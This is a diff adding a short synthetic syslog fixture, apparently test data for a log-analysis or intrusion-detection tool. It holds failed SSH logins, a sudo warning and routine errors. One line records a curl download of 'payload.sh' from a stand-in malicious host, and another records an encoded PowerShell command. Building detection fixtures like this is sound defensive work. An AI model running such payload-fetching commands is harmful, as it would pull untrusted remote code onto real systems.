@@ -1,0 +1,10 @@
+Jun 27 10:15:21 server sshd[1842]: Failed password for invalid user admin from 192.168.1.45 port 51422 ssh2
+Jun 27 10:15:24 server sshd[1842]: Failed password for invalid user admin from 192.168.1.45 port 51423 ssh2
+Jun 27 10:16:02 server sshd[1901]: Accepted password for vanessa from 192.168.1.20 port 51500 ssh2
+Jun 27 10:17:44 server sudo: warning: user attempted unauthorized command
+Jun 27 10:18:10 server kernel: error: failed service dependency
+Jun 27 10:20:12 server audit: USER_CMD pid=2001 cmd="powershell -enc suspicious"
+Jun 27 10:22:55 server web: curl http://malicious.example/payload.sh
+Jun 27 10:25:19 server sshd[2100]: Failed password for root from 10.0.0.8 port 51888 ssh2
+Jun 27 10:27:04 server app: critical error connecting to database
+Jun 27 10:30:00 server cron: job completed successfully
